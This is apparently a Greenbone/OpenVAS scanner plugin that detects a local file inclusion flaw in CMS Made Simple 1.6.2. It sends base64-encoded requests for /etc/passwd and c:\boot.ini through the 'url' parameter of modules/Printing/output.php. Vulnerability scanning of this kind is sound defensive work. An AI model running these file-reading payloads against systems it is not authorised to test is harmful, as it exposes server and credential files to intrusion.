CPE = "cpe:/a:cmsmadesimple:cms_made_simple";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.901141" );
	script_version( "2021-09-01T09:31:49+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 09:31:49 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2010-08-26 15:28:03 +0200 (Thu, 26 Aug 2010)" );
	script_bugtraq_id( 36005 );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "CMS Made Simple 'modules/Printing/output.php' Local File Include Vulnerability" );
	script_xref( name: "URL", value: "http://www.cmsmadesimple.org/2009/08/05/announcing-cmsms-163-touho/" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "cms_made_simple_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "cmsmadesimple/installed" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to obtain potentially sensitive
information and to execute arbitrary local scripts in the context of the webserver process." );
	script_tag( name: "affected", value: "CMS Made Simple version 1.6.2" );
	script_tag( name: "insight", value: "The flaw is caused by improper validation of user-supplied input via the
'url' parameter to 'modules/Printing/output.php' that allows remote attackers to view files and execute local
scripts in the context of the webserver." );
	script_tag( name: "solution", value: "Upgrade CMS Made Simple Version 1.6.3 or later." );
	script_tag( name: "summary", value: "This host is running CMS Made Simple and is prone to local file inclusion
vulnerability." );
	script_xref( name: "URL", value: "http://www.cmsmadesimple.org/downloads/" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
for file in make_list( "L2V0Yy9wYXNzd2Q=",
	 "YzpcYm9vdC5pbmk=" ) {
	url = dir + "/modules/Printing/output.php?url=" + file;
	if(http_vuln_check( port: port, url: url, pattern: "(root:.*:0:[01]:|\\[boot loader\\])" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

